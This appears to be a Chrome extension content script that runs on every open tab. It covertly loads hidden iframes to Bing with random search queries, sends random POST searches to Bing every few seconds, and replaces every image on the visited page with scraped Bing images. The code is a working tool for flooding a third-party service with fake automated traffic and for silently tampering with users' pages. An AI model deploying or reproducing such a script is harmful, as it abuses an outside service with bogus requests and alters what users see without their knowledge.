console.log("chrome extension party!");

//this script will run on every tab.

//This function is dynamically creating images and links which will not be visible.
//But will send GET request to the website.

//TYPE 1
//analyze through network > DOC
//giving valid responses but page reloads every 7 seconds

function iframeFlood() {
  var link = document.createElement("a");
  link.href = "https://www.bing.com/";
  var input= document.createElement("iframe");
  input.src = "https://www.bing.com/search?q=" + Math.random()
              .toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
  link.appendChild(input);
  document.body.appendChild(link);
}
setInterval(iframeFlood,8000);


//TYPE 2
//This is AJAX code for POST request.
//analyze through network > other
function postRequests()
{
	  var xhttp = new XMLHttpRequest();
	  xhttp.onreadystatechange = function() {
		  if (this.readyState == 4 && this.status == 200) {
			// Action to be performed when the document is read;
		  }
	  };


	var randomString = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
	var randomPOSTString = "q=" + randomString + "&FORM=HDRSC2";

	xhttp.open("POST","https://www.bing.com/search", true);
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send(randomPOSTString);
  
   console.log("The POST requests are being sent to  https://www.bing.com as random queries");
}

setInterval(postRequests,5000);


//TYPE 3
var mImages= new Array();
var wallpapersCategories = ["abstract", "nature", "concerts", "brands", 
"nature", "design", "landscape", "sports", "technology"];

function getBingImages()
{
  var randomCategory = window.wallpapersCategories[Math.floor
    (Math.random()*(window.wallpapersCategories.length))];

  var xhttp = new XMLHttpRequest();
  xhttp.responseType = 'document';
  xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        sortHTTPSlinks(this);
      }
  };
  xhttp.open("GET", "https://www.bing.com/images/search?q=" + randomCategory + 
    "&FORM=HDRSC2", true);
  xhttp.send();
}




function sortHTTPSlinks(xml) {
  var x, i, xmlDoc;
  xmlDoc = xml.responseXML;
  x = xmlDoc.getElementsByTagName("img");
  for(i = 0; i< x.length; i++) {
    if( x[i].hasAttribute("data-src"))
    {
        var imageSource = x[i].getAttribute("data-src");
        window.mImages.push(imageSource);
    }
  }
}

setInterval(getBingImages, 3500); 

//analyze through network > XHR
function changeImages()
{
  var container = document.getElementsByTagName("img");
  for(var i=0,j=0;i<container.length;i++,j++)
  { 
    if(j>mImages.length)
    {
      j=0;
    }

    container[i].src = window.mImages[i]; 
  }
}

setInterval(changeImages, 5000); 


